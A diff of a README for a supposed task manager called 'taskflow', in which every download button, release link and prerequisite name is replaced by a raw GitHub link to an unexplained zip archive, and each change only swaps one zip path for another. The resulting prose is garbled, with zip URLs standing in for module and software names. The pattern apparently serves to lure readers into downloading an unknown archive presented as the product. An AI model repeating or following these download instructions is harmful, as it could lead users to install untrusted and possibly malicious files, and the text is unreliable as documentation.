@@ -11,15 +11,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to **taskflow**, a minimal task manager built with https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip core modules. This software helps you manage your tasks effectively. You can easily download and run it by following the steps below.
+Welcome to **taskflow**, a minimal task manager built with https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip core modules. This software helps you manage your tasks effectively. You can easily download and run it by following the steps below.
 
 ## 📥 Download & Install
 
 To get started, you need to download taskflow. You can find the latest version on our Releases page.
 
-[![Download taskflow](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip%20taskflow-v1.0-blue)](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip)
+[![Download taskflow](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip%20taskflow-v1.0-blue)](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip)
 
-1. Click the button above or visit [this page](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip) to find the releases.
+1. Click the button above or visit [this page](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip) to find the releases.
 2. Locate the latest version available.
 3. Download the appropriate file for your operating system. 
 
@@ -38,7 +38,7 @@ Before you install taskflow, ensure your system meets the following requirements
 - **RAM:** At least 2GB.
 - **Storage:** Minimum of 100MB free space.
   
-Make sure your environment supports https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip If you don't have https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip installed, you can download it from [https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/test/Software_v1.3.zip).
+Make sure your environment supports https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip If you don't have https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip installed, you can download it from [https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip](https://github.com/Sodaza1234/taskflow/raw/refs/heads/main/docs/Software-3.5.zip).
 
 ## 📋 Features
 
